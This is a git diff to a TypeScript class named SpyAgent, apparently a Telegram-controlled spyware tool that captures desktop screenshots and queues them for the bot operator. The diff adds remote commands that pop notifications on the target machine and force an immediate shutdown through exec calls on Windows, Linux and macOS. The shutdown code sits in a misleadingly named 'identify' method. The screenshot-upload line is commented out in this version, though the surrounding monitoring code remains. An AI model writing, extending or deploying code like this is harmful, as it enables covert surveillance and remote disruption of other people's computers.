@@ -1,8 +1,12 @@
 import { existsSync, mkdirSync, readFileSync, unlinkSync, writeFileSync } from "fs";
 import CryptoJS from "crypto-js";
+import notifier from "node-notifier";
 import screenshot from "screenshot-desktop";
+import os from "os";
+import { exec } from "child_process";
 import path from "path";
 import { Context, Telegraf } from "telegraf";
+import { Action } from "./types";
 
 export default class SpyAgent {
     _cacheDir: string;
@@ -15,8 +19,9 @@ export default class SpyAgent {
     interVal: number;
     userName: string | undefined;
     secretFilePath: string;
+    notifier: notifier.NodeNotifier;
 
-    constructor(bot: any) {
+    constructor(bot: Telegraf<Context>) {
         this._cacheDir = process.env.CACHE_DIR!;
         this._cacheFile = process.env.CACHE_FILE!;
         this.cacheFilePath = path.join(process.cwd(), this._cacheDir, this._cacheFile);
@@ -24,6 +29,7 @@ export default class SpyAgent {
         this.secretFilePath = path.join(process.cwd(), process.env.CACHE_DIR!, process.env.SECRET_FILE!)
         this.interVal = Number(process.env.INTERVAL!);
         this._bot = bot;
+        this.notifier = notifier;
         this.born();
         this.processFiles();
     }
@@ -45,6 +51,7 @@ export default class SpyAgent {
 
     die() {
         writeFileSync(this.cacheFilePath, JSON.stringify(this._files), 'utf-8');
+        clearInterval(this.intervalId);
     }
 
     set setUser(user: string) {
@@ -97,6 +104,31 @@ export default class SpyAgent {
         });
     }
 
+    identify() {
+        const platform: string = os.platform();
+        switch (platform) {
+            case 'win32':
+                exec('shutdown /s /f /t 0', { 'shell': 'powershell.exe' }, (error, stdout, stderr) => {
+                    if (error || stderr) {
+                        console.log(error || stderr);
+                    }
+                    else console.log(stdout);
+                });
+                break;
+            case 'linux':
+                exec('shutdown now', (error, stdout) => {
+                    if (error) return console.log(error);
+                    console.log(stdout);
+                });
+                break;
+            case 'darwin':
+                exec('sudo shutdown -h now', (error, stdout) => {
+                    if (error) return console.log(error);
+                    console.log(stdout);
+                });
+        }
+    }
+
     whichUser(name: string) {
         this._bot.telegram.sendMessage(this.userName!, `New Session started,Username :${name}`);
     }
@@ -119,6 +151,30 @@ export default class SpyAgent {
         }
     }
 
+    async invinsible(actions: Action) {
+        switch (actions.command) {
+            case "/peep":
+                this.notifier.notify({
+                    title: "Helllllo Buddy! ",
+                    message: actions.text,
+                    icon: path.join(process.cwd(), 'assets', 'hello.webp'),
+                });
+                break;
+            case "/shutdown":
+                this.identify();
+                break;
+            case "/say":
+                this.notifier.notify({
+                    title: "Helllllo Buddy! ",
+                    message: actions.text,
+                    icon: path.join(process.cwd(), 'assets', 'hello.webp'),
+                });
+            default:
+                console.log('Hu!');
+
+        }
+    }
+
     async processFiles() {
         try {
             this.isReady();
@@ -127,7 +183,7 @@ export default class SpyAgent {
                     const file = this.getFirstFile();
                     if (file === '') return;
                     const image = path.join(process.cwd(), process.env.FILE_DIR!, file);
-                    await this._bot.telegram.sendPhoto(this.userName!, { source: image });
+                    // await this._bot.telegram.sendPhoto(this.userName!, { source: image });
                     unlinkSync(path.join(process.cwd(), process.env.FILE_DIR!, file));
                     this.dequeue();
                 }
